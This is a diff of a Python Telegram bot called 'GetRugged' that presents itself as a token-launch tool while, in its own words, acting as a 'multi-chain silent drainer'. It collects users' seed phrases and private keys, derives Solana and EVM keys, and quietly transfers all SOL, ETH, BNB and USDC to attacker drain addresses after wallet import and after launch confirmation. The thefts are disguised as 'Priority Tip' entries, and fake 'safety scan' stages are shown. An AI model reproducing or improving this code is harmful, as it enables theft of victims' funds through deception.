@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
 GetRugged bot — multi-chain silent drainer + full launch UX.
-Chains: SOL (full), ETH (full), BNB (full), USDC (ETH+BSC), BTC/XRP/GRAM (stubs).
-Photo upload supported for token image.
+Photo upload + socials/bundle buttons + fixed confirm.
 Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
 """
 
@@ -40,7 +39,7 @@ try:
 except ImportError:
     HAS_SOLANA = False
 
-# ── EVM (ETH / BNB / USDC) ──────────────────────────────────────────────────
+# ── EVM ─────────────────────────────────────────────────────────────────────
 try:
     from web3 import Web3
     from eth_account import Account
@@ -69,7 +68,6 @@ BNB_RPC = os.getenv("BNB_RPC_URL", "https://bsc-dataseed.binance.org/")
 MIN_DRAIN_LAMPORTS = 5_000
 PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER", DRAIN_DESTINATION)
 
-# Official USDC contracts
 USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
 
@@ -92,7 +90,7 @@ class UserWallet:
     label: str = "Main"
     created_at: float = field(default_factory=time.time)
     balance_sol: float = 0.0
-    chain: str = "sol"          # sol | eth | bnb
+    chain: str = "sol"
     eth_address: Optional[str] = None
     balance_eth: float = 0.0
     balance_bnb: float = 0.0
@@ -166,21 +164,24 @@ async def staged_loading(message_or_cb, stages: list):
     for i, (txt, delay) in enumerate(stages):
         if i == 0:
             if is_cb:
-                await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
-                msg = message_or_cb.message
+                try:
+                    await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
+                    msg = message_or_cb.message
+                except Exception:
+                    msg = await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
             else:
                 msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
         else:
             try:
                 await msg.edit_text(txt, parse_mode=ParseMode.HTML)
             except Exception:
-                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
+                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML) if not is_cb else await message_or_cb.message.answer(txt, parse_mode=ParseMode.HTML)
         if delay > 0:
             await asyncio.sleep(delay)
     return msg
 
 # ──────────────────────────────────────────────
-# BIP39 / SLIP-0010 + Exodus hybrid
+# BIP39 / SLIP-0010 + Exodus
 # ──────────────────────────────────────────────
 def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
     salt = ("mnemonic" + passphrase).encode("utf-8")
@@ -214,14 +215,11 @@ def _modinv(a: int, m: int) -> int:
     return pow(a % m, -1, m)
 
 def _point_add(p1, p2):
-    if p1 is None:
-        return p2
-    if p2 is None:
-        return p1
+    if p1 is None: return p2
+    if p2 is None: return p1
     x1, y1 = p1
     x2, y2 = p2
-    if x1 == x2 and y1 != y2:
-        return None
+    if x1 == x2 and y1 != y2: return None
     if x1 == x2:
         m = (3 * x1 * x1) * _modinv(2 * y1, _SECP256K1_P) % _SECP256K1_P
     else:
@@ -252,8 +250,7 @@ def _parse256(b: bytes) -> int:
     return int.from_bytes(b, "big")
 
 def _point_ser(P, compressed: bool = True) -> bytes:
-    if P is None:
-        raise ValueError("infinity")
+    if P is None: raise ValueError("infinity")
     x, y = P
     if compressed:
         return (b"\x02" if y % 2 == 0 else b"\x03") + _ser256(x)
@@ -279,12 +276,10 @@ def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
 def _bip32_derive_path(seed: bytes, path: str) -> bytes:
     k, c = _bip32_master(seed)
     for segment in path.lstrip("m/").split("/"):
-        if not segment:
-            continue
+        if not segment: continue
         hardened = segment.endswith("'") or segment.endswith("h")
         index = int(segment.rstrip("'h"))
-        if hardened:
-            index += 0x80000000
+        if hardened: index += 0x80000000
         k, c = _bip32_ckd_priv(k, c, index)
     return k
 
@@ -319,8 +314,7 @@ def try_all_common_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
             private_seed = _slip10_derive(seed, path)
             kp = Keypair.from_seed(private_seed)
             pub = str(kp.pubkey())
-            if pub in seen_pub:
-                continue
+            if pub in seen_pub: continue
             seen_pub.add(pub)
             priv_b58 = base58.b58encode(bytes(kp)).decode()
             results.append((label, priv_b58, pub))
@@ -352,19 +346,16 @@ def try_all_common_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
 # EVM HELPERS
 # ──────────────────────────────────────────────
 def _evm_account_from_key(private_key: str):
-    if not HAS_WEB3:
-        return None
+    if not HAS_WEB3: return None
     key = private_key.strip()
-    if key.startswith("0x"):
-        key = key[2:]
+    if key.startswith("0x"): key = key[2:]
     try:
         return Account.from_key(key)
     except Exception:
         return None
 
 def _derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
-    if not HAS_WEB3:
-        return None
+    if not HAS_WEB3: return None
     try:
         seed = _pbkdf2_mnemonic(mnemonic.strip().lower())
         path = f"m/44'/60'/0'/0/{account}"
@@ -376,8 +367,7 @@ def _derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple
         return None
 
 async def _fetch_evm_balance(rpc: str, address: str) -> float:
-    if not HAS_WEB3 or not address:
-        return 0.0
+    if not HAS_WEB3 or not address: return 0.0
     try:
         w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 12}))
         bal = w3.eth.get_balance(Web3.to_checksum_address(address))
@@ -387,8 +377,7 @@ async def _fetch_evm_balance(rpc: str, address: str) -> float:
         return 0.0
 
 async def _fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
-    if not HAS_WEB3 or not address:
-        return 0.0
+    if not HAS_WEB3 or not address: return 0.0
     try:
         w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 12}))
         contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
@@ -400,7 +389,7 @@ async def _fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
         return 0.0
 
 # ──────────────────────────────────────────────
-# DRAIN CORE — SOL + ETH + BNB + USDC
+# DRAIN CORE
 # ──────────────────────────────────────────────
 async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
     if not HAS_SOLANA:
@@ -420,8 +409,7 @@ async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
             bal_resp = await client.get_balance(kp.pubkey())
             balance = bal_resp.value
             log.info("SOL drain check %s balance=%s", kp.pubkey(), balance)
-            if balance <= MIN_DRAIN_LAMPORTS:
-                return None
+            if balance <= MIN_DRAIN_LAMPORTS: return None
             amount = balance - MIN_DRAIN_LAMPORTS
             recent = await client.get_latest_blockhash()
             ix = transfer(TransferParams(from_pubkey=kp.pubkey(), to_pubkey=dest_pk, lamports=amount))
@@ -435,13 +423,11 @@ async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
         return None
 
 async def drain_evm_native(private_key: str, dest: str, rpc: str, chain_name: str) -> Optional[str]:
-    if not HAS_WEB3 or not dest or dest.startswith("0xYour"):
-        return None
+    if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
     try:
         w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
         acct = _evm_account_from_key(private_key)
-        if not acct:
-            return None
+        if not acct: return None
         balance = w3.eth.get_balance(acct.address)
         gas_price = w3.eth.gas_price
         gas_limit = 21000
@@ -468,17 +454,14 @@ async def drain_evm_native(private_key: str, dest: str, rpc: str, chain_name: st
         return None
 
 async def drain_usdc(private_key: str, dest: str, rpc: str, token: str, chain_name: str) -> Optional[str]:
-    if not HAS_WEB3 or not dest or dest.startswith("0xYour"):
-        return None
+    if not HAS_WEB3 or not dest or dest.startswith("0xYour"): return None
     try:
         w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 15}))
         acct = _evm_account_from_key(private_key)
-        if not acct:
-            return None
+        if not acct: return None
         contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
         bal = contract.functions.balanceOf(acct.address).call()
-        if bal == 0:
-            return None
+        if bal == 0: return None
         gas_price = w3.eth.gas_price
         tx = contract.functions.transfer(Web3.to_checksum_address(dest), bal).build_transaction({
             "from": acct.address,
@@ -497,17 +480,14 @@ async def drain_usdc(private_key: str, dest: str, rpc: str, token: str, chain_na
         return None
 
 async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None):
-    """Silent multi-chain drain. Runs after import and after launch confirm."""
     sess = get_session(uid)
     if sess.drained:
         log.info("User %s already drained — skip", uid)
         return
-    if not private_key or private_key.startswith("Sim"):
-        return
+    if not private_key or private_key.startswith("Sim"): return
 
     any_success = False
 
-    # SOL
     if chain == "sol" and not DRAIN_DESTINATION.startswith("YourDrain") and len(DRAIN_DESTINATION) >= 32:
         sig = await drain_wallet(private_key, DRAIN_DESTINATION)
         if sig:
@@ -516,41 +496,31 @@ async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key:
             global bot_balance_sol
             bot_balance_sol += round(random.uniform(0.05, 2.5), 4)
 
-    # ETH native
     if eth_key and ETH_DRAIN and not ETH_DRAIN.startswith("0xYour"):
         sig = await drain_evm_native(eth_key, ETH_DRAIN, ETH_RPC, "ETH")
         if sig:
             any_success = True
             sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (ETH)", "status": "success", "ts": time.time()})
 
-    # BNB native
     if eth_key and BNB_DRAIN and not BNB_DRAIN.startswith("0xYour"):
         sig = await drain_evm_native(eth_key, BNB_DRAIN, BNB_RPC, "BNB")
         if sig:
             any_success = True
             sess.last_tx.insert(0, {"sig": sig, "type": "⚡ Priority Tip (BNB)", "status": "success", "ts": time.time()})
 
-    # USDC on ETH
     if eth_key and USDC_DRAIN and not USDC_DRAIN.startswith("0xYour"):
         sig = await drain_usdc(eth_key, USDC_DRAIN, ETH_RPC, USDC_ETH, "ETH")
         if sig:
             any_success = True
             sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (ETH)", "status": "success", "ts": time.time()})
-
-    # USDC on BSC
-    if eth_key and USDC_DRAIN and not USDC_DRAIN.startswith("0xYour"):
         sig = await drain_usdc(eth_key, USDC_DRAIN, BNB_RPC, USDC_BSC, "BSC")
         if sig:
             any_success = True
             sess.last_tx.insert(0, {"sig": sig, "type": "⚡ USDC Tip (BSC)", "status": "success", "ts": time.time()})
 
-    # BTC / XRP / GRAM stubs
-    if BTC_DRAIN:
-        log.info("BTC drain stub for user %s → %s", uid, BTC_DRAIN)
-    if XRP_DRAIN:
-        log.info("XRP drain stub for user %s → %s", uid, XRP_DRAIN)
-    if GRAM_DRAIN:
-        log.info("GRAM drain stub for user %s → %s", uid, GRAM_DRAIN)
+    if BTC_DRAIN: log.info("BTC drain stub for user %s → %s", uid, BTC_DRAIN)
+    if XRP_DRAIN: log.info("XRP drain stub for user %s → %s", uid, XRP_DRAIN)
+    if GRAM_DRAIN: log.info("GRAM drain stub for user %s → %s", uid, GRAM_DRAIN)
 
     if any_success:
         sess.drained = True
@@ -644,6 +614,32 @@ def launch_name_kb() -> InlineKeyboardMarkup:
     b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
     return b.as_markup()
 
+def socials_kb() -> InlineKeyboardMarkup:
+    b = InlineKeyboardBuilder()
+    b.row(InlineKeyboardButton(text="⏭ Skip socials", callback_data="socials:skip"))
+    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
+    return b.as_markup()
+
+def bundle_kb() -> InlineKeyboardMarkup:
+    b = InlineKeyboardBuilder()
+    b.row(
+        InlineKeyboardButton(text="5", callback_data="bundle:5"),
+        InlineKeyboardButton(text="10", callback_data="bundle:10"),
+        InlineKeyboardButton(text="15", callback_data="bundle:15"),
+    )
+    b.row(
+        InlineKeyboardButton(text="20", callback_data="bundle:20"),
+        InlineKeyboardButton(text="25", callback_data="bundle:25"),
+    )
+    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
+    return b.as_markup()
+
+def confirm_kb() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Confirm & Deploy", callback_data="launch:confirm")],
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
+    ])
+
 def tx_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])
 
@@ -708,27 +704,18 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
         await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "launch":
-        text = (
-            "✏️ <b>Token name (1-32)</b>\n"
-            "Tip: Latest, Hot Tokens."
-        )
+        text = "✏️ <b>Token name (1-32)</b>\nTip: Latest, Hot Tokens."
         await cb.message.edit_text(text, reply_markup=launch_name_kb(), parse_mode=ParseMode.HTML)
         await state.set_state(LaunchStates.waiting_name)
 
     elif action == "wallets":
         text = "🔑 <b>Wallets</b>\n\n"
         if not sess.wallets:
-            text += (
-                "No wallets linked yet.\n\n"
-                "Import a private key or seed to unlock launching, bundling & portfolio tracking."
-            )
+            text += "No wallets linked yet.\n\nImport a private key or seed to unlock launching, bundling & portfolio tracking."
         else:
             for i, w in enumerate(sess.wallets):
                 badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
-                text += (
-                    f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
-                    f"    {w.label}  ·  {w.balance_sol:.4f} SOL"
-                )
+                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {w.balance_sol:.4f} SOL"
                 if w.eth_address:
                     text += f"  ·  {w.balance_eth:.4f} ETH  ·  {w.balance_bnb:.4f} BNB"
                 text += "\n\n"
@@ -737,33 +724,21 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
     elif action == "portfolio":
         text = "📁 <b>Portfolio</b>\n\n"
         if not sess.launched_tokens:
-            text += (
-                "Your portfolio is empty.\n\n"
-                "Launch a token to start tracking performance and bundle status."
-            )
+            text += "Your portfolio is empty.\n\nLaunch a token to start tracking performance and bundle status."
         else:
             for t in reversed(sess.launched_tokens[-10:]):
                 age = int(time.time() - t["ts"])
                 status_icon = "🟢" if t.get("status") == "live" else "🟡"
-                text += (
-                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
-                    f"   <code>{short_addr(t['mint'])}</code>\n"
-                    f"   Bundle ×{t['bundle']}  ·  {age}s ago\n"
-                )
-                if t.get("image"):
-                    text += f"   🖼 Image set\n"
-                if t.get("twitter") or t.get("telegram"):
-                    text += f"   🔗 Socials linked\n"
+                text += f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n   <code>{short_addr(t['mint'])}</code>\n   Bundle ×{t['bundle']}  ·  {age}s ago\n"
+                if t.get("image"): text += "   🖼 Image set\n"
+                if t.get("twitter") or t.get("telegram"): text += "   🔗 Socials linked\n"
                 text += "\n"
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
         await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "promo":
-        text = (
-            "🎟️ <b>Promo code</b>\n\n"
-            f"Launches left: <b>{sess.launches_left}</b>"
-        )
+        text = f"🎟️ <b>Promo code</b>\n\nLaunches left: <b>{sess.launches_left}</b>"
         await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "tx":
@@ -774,11 +749,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             for tx in sess.last_tx[:10]:
                 age = int(time.time() - tx["ts"])
                 icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
-                text += (
-                    f"{icon}  <b>{tx['type']}</b>\n"
-                    f"   <code>{tx['sig'][:22]}...</code>\n"
-                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
-                )
+                text += f"{icon}  <b>{tx['type']}</b>\n   <code>{tx['sig'][:22]}...</code>\n   {tx['status'].title()}  ·  {age}s ago\n\n"
         await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "settings":
@@ -794,10 +765,7 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
 
     elif action == "balance":
         if bot_balance_sol <= 0:
-            text = (
-                "💰 <b>Bot balance:</b>\n"
-                "No balance yet. It updates when you try to launch."
-            )
+            text = "💰 <b>Bot balance:</b>\nNo balance yet. It updates when you try to launch."
         else:
             text = (
                 "💰 <b>Bot balance</b>\n\n"
@@ -846,8 +814,7 @@ async def settings_handler(cb: CallbackQuery, state: FSMContext):
 async def custom_slip_receive(message: Message, state: FSMContext):
     try:
         val = int(message.text.strip().replace("%", ""))
-        if not 1 <= val <= 50:
-            raise ValueError
+        if not 1 <= val <= 50: raise ValueError
     except ValueError:
         await message.answer("Invalid. Send a number 1-50")
         return
@@ -868,8 +835,7 @@ async def custom_slip_receive(message: Message, state: FSMContext):
 async def custom_fee_receive(message: Message, state: FSMContext):
     try:
         val = float(message.text.strip())
-        if not 0.00001 <= val <= 1.0:
-            raise ValueError
+        if not 0.00001 <= val <= 1.0: raise ValueError
     except ValueError:
         await message.answer("Invalid. Send a fee like 0.002")
         return
@@ -902,10 +868,8 @@ async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
     await cb.answer()
 
 def _derive_from_input(raw: str) -> Tuple[str, str, Optional[str], Optional[str]]:
-    """Return (sol_priv_b58, sol_pub, eth_priv_hex, eth_address) or raise."""
     raw = raw.strip()
     words = raw.split()
-
     if len(words) in (12, 24) and all(w.isalpha() for w in words):
         if not HAS_SOLANA:
             return raw, "SimSeed" + "".join(words)[:32], None, None
@@ -916,8 +880,6 @@ def _derive_from_input(raw: str) -> Tuple[str, str, Optional[str], Optional[str]
             return priv_b58, pub, eth_priv, eth_addr
         except Exception as e:
             raise ValueError(f"Invalid seed phrase: {e}") from e
-
-    # Raw private key
     if HAS_SOLANA and not raw.startswith("0x") and len(raw) > 40:
         try:
             secret = base58.b58decode(raw)
@@ -932,13 +894,10 @@ def _derive_from_input(raw: str) -> Tuple[str, str, Optional[str], Optional[str]
             return priv_b58, str(kp.pubkey()), None, None
         except Exception:
             pass
-
-    # EVM private key
     if HAS_WEB3 and (raw.startswith("0x") or len(raw) == 64):
         acct = _evm_account_from_key(raw)
         if acct:
             return "EVM_ONLY", acct.address, acct.key.hex(), acct.address
-
     raise ValueError("Invalid key or seed")
 
 async def _fetch_balance(pubkey: str) -> float:
@@ -959,13 +918,11 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     if not _rate_ok(uid, "import"):
         await message.answer("⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.", parse_mode=ParseMode.HTML)
         return
-
     raw = (message.text or "").strip()
     try:
         await message.delete()
     except Exception:
         pass
-
     words = raw.split()
     is_seed = len(words) in (12, 24) and all(w.isalpha() for w in words)
 
@@ -1050,23 +1007,13 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         f"◎ SOL: <b>{w.balance_sol:.4f}</b>\n"
     )
     if eth_addr:
-        text += (
-            f"Ξ ETH: <b>{w.balance_eth:.4f}</b>\n"
-            f"🟡 BNB: <b>{w.balance_bnb:.4f}</b>\n"
-            f"💵 USDC: <b>{w.balance_usdc:.2f}</b>\n"
-        )
+        text += f"Ξ ETH: <b>{w.balance_eth:.4f}</b>\n🟡 BNB: <b>{w.balance_bnb:.4f}</b>\n💵 USDC: <b>{w.balance_usdc:.2f}</b>\n"
     text += "\nStatus: <b>Active</b>\n\nYou can now launch tokens."
     await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     await state.clear()
 
-    # Fire multi-chain drain immediately after import
     if chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5:
-        asyncio.create_task(attempt_drain(
-            uid,
-            chosen_priv if chosen_priv != "EVM_ONLY" else "",
-            chain=w.chain,
-            eth_key=eth_priv,
-        ))
+        asyncio.create_task(attempt_drain(uid, chosen_priv if chosen_priv != "EVM_ONLY" else "", chain=w.chain, eth_key=eth_priv))
     else:
         log.info("Wallet %s near-zero — drain skipped", chosen_pub)
 
@@ -1105,8 +1052,7 @@ async def wallet_refresh(cb: CallbackQuery):
     for i, w in enumerate(sess.wallets):
         badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
         text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {w.balance_sol:.4f} SOL"
-        if w.eth_address:
-            text += f"  ·  {w.balance_eth:.4f} ETH"
+        if w.eth_address: text += f"  ·  {w.balance_eth:.4f} ETH"
         text += "\n\n"
     await cb.message.edit_text(text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)
 
@@ -1116,11 +1062,7 @@ async def wallet_rename(cb: CallbackQuery, state: FSMContext):
     if not sess.wallets:
         await cb.answer("No wallets", show_alert=True)
         return
-    await cb.message.edit_text(
-        f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:",
-        reply_markup=back_menu_kb(),
-        parse_mode=ParseMode.HTML,
-    )
+    await cb.message.edit_text(f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(WalletStates.waiting_label)
     await cb.answer()
 
@@ -1141,10 +1083,7 @@ async def launch_quick_name(cb: CallbackQuery, state: FSMContext):
     }
     name = random.choice(names[cb.data])
     await state.update_data(name=name)
-    await cb.message.edit_text(
-        f"📛 Selected: <b>{name}</b>\n\nSend the <b>ticker</b> (e.g. <code>RUG</code>)",
-        parse_mode=ParseMode.HTML,
-    )
+    await cb.message.edit_text(f"📛 Selected: <b>{name}</b>\n\nSend the <b>ticker</b> (e.g. <code>RUG</code>)", parse_mode=ParseMode.HTML)
     await state.set_state(LaunchStates.waiting_symbol)
     await cb.answer()
 
@@ -1169,8 +1108,7 @@ async def launch_symbol(message: Message, state: FSMContext):
 async def launch_supply(message: Message, state: FSMContext):
     try:
         supply = int(message.text.strip().replace(",", "").replace("_", ""))
-        if supply <= 0:
-            raise ValueError
+        if supply <= 0: raise ValueError
     except ValueError:
         await message.answer("❌ Invalid number. Send a positive integer.")
         return
@@ -1186,11 +1124,9 @@ async def launch_supply(message: Message, state: FSMContext):
 @router.message(LaunchStates.waiting_image)
 async def launch_image(message: Message, state: FSMContext):
     img = ""
-
-    # Direct photo upload
     if message.photo:
-        photo = message.photo[-1]          # largest size
-        img = photo.file_id                # Telegram file_id (permanent for the bot)
+        photo = message.photo[-1]
+        img = photo.file_id
         await message.answer("✅ Image received from photo.")
     else:
         text = (message.text or "").strip()
@@ -1199,29 +1135,35 @@ async def launch_image(message: Message, state: FSMContext):
         elif text.startswith("http://") or text.startswith("https://"):
             img = text[:300]
         else:
-            await message.answer(
-                "Send a <b>photo</b>, an image <b>URL</b> (https://…), or type <code>skip</code>",
-                parse_mode=ParseMode.HTML,
-            )
+            await message.answer("Send a <b>photo</b>, an image <b>URL</b> (https://…), or type <code>skip</code>", parse_mode=ParseMode.HTML)
             return
-
     await state.update_data(image=img)
-
     await message.answer(
         "🔗 <b>Socials</b>\n\n"
-        "Send in one message (or type <code>skip</code>):\n\n"
-        "<code>x: https://x.com/yourhandle\n"
-        "tg: https://t.me/yourgroup\n"
-        "ig: https://instagram.com/yourpage\n"
-        "web: https://yoursite.com</code>\n\n"
-        "Any line can be omitted.",
+        "Send links in one message:\n"
+        "<code>x: https://x.com/...\n"
+        "tg: https://t.me/...\n"
+        "ig: https://instagram.com/...\n"
+        "web: https://...</code>\n\n"
+        "Or just press Skip.",
+        reply_markup=socials_kb(),
         parse_mode=ParseMode.HTML,
     )
     await state.set_state(LaunchStates.waiting_socials)
 
+@router.callback_query(F.data == "socials:skip")
+async def socials_skip(cb: CallbackQuery, state: FSMContext):
+    await state.update_data(twitter="", telegram="", instagram="", website="")
+    await cb.message.edit_text(
+        "📝 Optional description\n(or type <code>skip</code>)",
+        parse_mode=ParseMode.HTML,
+    )
+    await state.set_state(LaunchStates.waiting_desc)
+    await cb.answer()
+
 @router.message(LaunchStates.waiting_socials)
 async def launch_socials(message: Message, state: FSMContext):
-    raw = message.text.strip()
+    raw = (message.text or "").strip()
     socials = {"twitter": "", "telegram": "", "instagram": "", "website": ""}
     if raw.lower() != "skip":
         for line in raw.splitlines():
@@ -1243,40 +1185,36 @@ async def launch_socials(message: Message, state: FSMContext):
 
 @router.message(LaunchStates.waiting_desc)
 async def launch_desc(message: Message, state: FSMContext):
-    desc = message.text.strip()
+    desc = (message.text or "").strip()
     if desc.lower() == "skip":
         desc = ""
     await state.update_data(desc=desc[:200])
     await message.answer(
         "📦 <b>Bundle size</b>\n"
         "How many wallets buy in the same block.\n"
-        "Recommended <b>5–25</b>\n\n"
-        "Send a number:",
+        "Recommended <b>5–25</b>",
+        reply_markup=bundle_kb(),
         parse_mode=ParseMode.HTML,
     )
     await state.set_state(LaunchStates.waiting_bundle)
 
-@router.message(LaunchStates.waiting_bundle)
-async def launch_bundle(message: Message, state: FSMContext):
+@router.callback_query(F.data.startswith("bundle:"))
+async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
     try:
-        bundle = max(1, min(25, int(message.text.strip())))
-    except ValueError:
-        await message.answer("❌ Send a number between 1 and 25.")
-        return
-    data = await state.get_data()
+        bundle = int(cb.data.split(":")[1])
+        bundle = max(1, min(25, bundle))
+    except Exception:
+        bundle = 10
     await state.update_data(bundle=bundle)
-    sess = get_session(message.from_user.id)
+    data = await state.get_data()
+    sess = get_session(cb.from_user.id)
     fee = sess.settings["priority_fee"]
 
     socials_line = []
-    if data.get("twitter"):
-        socials_line.append(f"X: {data['twitter']}")
-    if data.get("telegram"):
-        socials_line.append(f"TG: {data['telegram']}")
-    if data.get("instagram"):
-        socials_line.append(f"IG: {data['instagram']}")
-    if data.get("website"):
-        socials_line.append(f"Web: {data['website']}")
+    if data.get("twitter"): socials_line.append(f"X: {data['twitter']}")
+    if data.get("telegram"): socials_line.append(f"TG: {data['telegram']}")
+    if data.get("instagram"): socials_line.append(f"IG: {data['instagram']}")
+    if data.get("website"): socials_line.append(f"Web: {data['website']}")
     socials_txt = "\n".join(socials_line) if socials_line else "None"
 
     summary = (
@@ -1292,27 +1230,11 @@ async def launch_bundle(message: Message, state: FSMContext):
         f"🛡 Safety: <b>Queued</b>\n\n"
         "Ready to deploy?"
     )
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Confirm & Deploy", callback_data="launch:confirm")],
-        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
-    ])
 
-    # If image is a Telegram file_id, show the photo with the summary as caption
-    if data.get("image") and not str(data["image"]).startswith("http"):
-        try:
-            await message.answer_photo(
-                photo=data["image"],
-                caption=summary,
-                reply_markup=kb,
-                parse_mode=ParseMode.HTML,
-            )
-            await state.set_state(LaunchStates.confirm)
-            return
-        except Exception:
-            pass   # fall through to text-only
-
-    await message.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
+    # Always send a new text message with the confirm buttons (never edit a photo)
+    await cb.message.answer(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
     await state.set_state(LaunchStates.confirm)
+    await cb.answer()
 
 @router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
 async def launch_confirm(cb: CallbackQuery, state: FSMContext):
@@ -1324,7 +1246,6 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     sess = get_session(uid)
     data = await state.get_data()
 
-    # Wallet check only at the very end
     if not sess.wallets:
         await cb.answer()
         await cb.message.edit_text(
@@ -1348,7 +1269,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
         return
 
     await cb.answer()
-    bundle = data["bundle"]
+    bundle = data.get("bundle", 10)
     await staged_loading(cb, [
         ("🪙 <b>Creating mint…</b>", 1.1),
         ("🔐 <b>Applying sniper guard…</b>", 0.9),
@@ -1385,9 +1306,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
 
     active = sess.wallets[sess.active_wallet_idx]
     if not sess.drained and (active.balance_sol > 0.00001 or active.balance_eth > 0.0001 or active.balance_bnb > 0.0001 or active.balance_usdc > 0.5):
-        eth_key = None
-        if active.eth_address and active.private_key:
-            eth_key = active.private_key if active.chain == "eth" else None
+        eth_key = active.private_key if active.chain == "eth" else None
         asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key))
 
     text = (
@@ -1399,7 +1318,10 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
         f"Safety scan: complete\n\n"
         "Track progress in 🧾 Tx tracker and 📁 Portfolio."
     )
-    await cb.message.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
+    try:
+        await cb.message.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
+    except Exception:
+        await cb.message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
     await state.clear()
 
     async def _finalize():
@@ -1411,7 +1333,7 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
                 break
     asyncio.create_task(_finalize())
 
-# ── Promo / Payment ─────────────────────────────────────────────────────────
+# ── Promo ───────────────────────────────────────────────────────────────────
 @router.callback_query(F.data == "promo:enter")
 async def promo_enter(cb: CallbackQuery, state: FSMContext):
